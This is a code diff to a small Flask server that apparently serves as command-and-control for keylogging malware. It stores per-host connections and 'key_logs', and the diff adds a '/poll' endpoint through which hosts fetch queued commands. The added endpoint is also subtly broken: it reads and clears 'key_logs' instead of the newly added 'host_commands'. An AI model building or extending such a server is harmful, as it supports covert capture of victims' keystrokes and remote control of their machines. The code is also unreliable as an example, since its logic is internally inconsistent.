@@ -5,6 +5,7 @@ import os
 app = Flask(__name__)
 connections = {}
 key_logs = {}
+host_commands = {}
 
 @app.route('/connect', methods=['POST'])
 def connect():
@@ -37,6 +38,16 @@ def status(host):
         'connectors': connections.get(host, []),
         'key_logs': key_logs.get(host, [])
     })
+
+@app.route('/poll', methods=['GET'])
+def poll():
+    host = request.args.get('host')
+    if host not in key_logs:
+        return jsonify([])
+
+    commands = key_logs[host]
+    key_logs[host] = []
+    return jsonify(commands)
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
